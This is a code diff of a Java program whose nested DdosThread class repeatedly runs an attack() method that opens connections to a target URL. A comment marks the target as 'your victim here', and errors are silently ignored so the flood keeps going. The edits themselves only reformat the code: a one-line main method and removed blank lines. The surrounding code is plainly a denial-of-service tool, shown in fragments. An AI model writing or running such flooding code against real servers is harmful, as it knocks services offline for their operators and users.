@@ -46,12 +46,9 @@ public class Main extends Frame{
         }
     }
 
-    public static void main(String[] args) {
-        Main app = new Main();
-    }
+    public static void main(String[] args) { Main app = new Main(); }
 
     public static class DdosThread extends Thread {
-
         private final AtomicBoolean running = new AtomicBoolean(true);
         private final String request; //your victim here
         private final URL url;
@@ -69,7 +66,6 @@ public class Main extends Frame{
                 try {
                     attack();
                 } catch (Exception ignored) {}
-
             }
         }
 
@@ -91,5 +87,4 @@ public class Main extends Frame{
             connection.getInputStream();
         }
     }
-
 }
